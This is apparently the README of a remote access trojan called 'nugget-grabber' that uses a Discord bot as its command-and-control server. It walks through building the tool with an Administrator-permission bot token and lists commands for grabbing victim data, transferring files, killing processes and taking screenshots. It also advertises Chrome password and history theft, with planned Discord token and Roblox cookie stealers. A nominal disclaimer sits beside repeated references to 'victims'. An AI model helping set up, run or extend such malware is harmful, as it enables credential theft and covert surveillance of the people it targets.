# nugget-grabber

Nugget grabber is an advanced RAT (remote access trojan) which uses a discord server as its command and control center. 

## Content

- [Patch notes](#Patch-notes)
- [Disclaimer](#DISCLAIMER)
- [Setup](#Setup)
- [Commands](#Commands)
- [TODO](#Upcoming)

# Patch-notes
+ Added a new `.grab history` command
- `.show processes` under development
+ `.kill` command


# DISCLAIMER

THIS IS DANGEROUS SOFTWARE THAT SHOULD NOT BE USED FOR HARM. THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES. USING SOFTWARE LIKE THIS FOR HARM IS ILLEGAL, SO USE WITH CAUTION.



# Setup
1. Create a discord application on [Discord Developer Portal.](https://discord.com/developers/applications)
2. Navigate to `Bot` in the left sidebar.
3. Click `Make-a-bot!`.
4. Scroll down until you see a screen for the bots permissions.
5. Click `Administrator`
6. Scroll up and click `Reset Token`
8. Open up the terminal in the repositorys folder.
9. Run `pip install -r packs.txt`
10. Run the `bulder.bat` file. (support for linux *soon*)
11. Follow the building process.
12. Once you reach the "Enter you discord bots token: " prompt go back to the developer portal and copy your token and paste it there.
13. Youre done!



# Commands
`.kill <task-name>` Ends a process.

.`ping` This command checks the bot's latency and responds with a message containing the latency in milliseconds.

.`clear` This command allows the bot to delete a specified number of messages (including the command itself) from the channel where the command was issued.

`.grab <info>` This command grabs information on victims computer

`.download`download <file_path>` This command allows users to download a file from the bot's host machine. The bot sends the file as an attachment in the Discord channel.

`.upload <num_of_files>` This command prompts the user to upload a specified number of files. The bot waits for the user to upload the files and saves them to its host machine.

`.ss` (or .screenshot) This command captures a screenshot of the entire screen and sends it as an image file in the Discord channel.

# Features
### Nugget grabber is still under development, but it can still:
- Steal **CHROME** passwords
- Steal **CHROME** history
- Upload files to victims computer
- Download files from victims computer
- ping
- Clear messages.

# --UPCOMING--
-  [ ] Control multiple PC's
-  [ ] Global password stealer (steal every browsers saved passwords)
-  [ ] Discord token stealer
-  [ ] Roblox cookie stealer
-  [ ] Shell access
-  [ ] Make it pretty
